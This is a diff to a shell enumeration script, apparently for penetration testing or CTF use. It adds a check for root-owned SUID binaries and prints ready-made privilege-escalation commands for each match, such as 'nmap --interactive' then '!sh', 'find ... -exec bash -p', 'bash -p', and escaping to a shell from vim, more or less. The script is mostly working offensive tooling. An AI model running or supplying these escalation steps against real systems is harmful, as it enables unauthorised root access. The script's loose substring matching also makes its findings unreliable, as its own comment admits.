@@ -50,8 +50,39 @@ w
 echo ""
 
 #find suid executables
-echo "-----SUID EXECUTABLES-----"
+#nmap, find, vim, bash, more, less, nano, cp
+#yes, im doing this completely inefficiently. fight me
+echo -----"SUID EXECUTABLES-----"
 find /* -user root -perm -4000 -print 2>/dev/null
+echo ""
+echo "Searching for insta-SUID-wins:"
+if find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'nmap';
+then
+  echo "NMAP has SUID permissions. Run 'nmap --interactive', then '!sh' for root shell."
+elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'find';
+then
+  echo "FIND has SUID permissions. Run 'find [file] -exec bash -p \;' for root shell."
+elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'vim';
+then
+  echo "VIM has SUID permissions. Run 'vim', then hit escape, type ':set shell=/bin/sh', ':shell' for root shell or edit sensitive files."
+elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'bash';
+then
+  echo "BASH has SUID permissions. Run 'bash -p' for root shell."
+elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'more';
+then
+  echo "MORE has SUID permissions. Run 'more /etc/passwd', '!/bin/sh' for root shell."
+elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'less';
+then
+  echo "LESS has SUID permissions. Run 'less /etc/passwd', '!/bin/sh' for root shell."
+elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'nano';
+then
+  echo "NANO has SUID permissions. Visit https://gtfobins.github.io/gtfobins/nano/#suid"
+elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'cp';
+then
+  echo "CP has SUID permissions. Visit https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/"
+else
+  echo "None found. Or they were found and I broke. I dunno. I wouldnt trust me."
+fi
 echo ""
 
 #might be helpful to run this without looking for root processes aswell
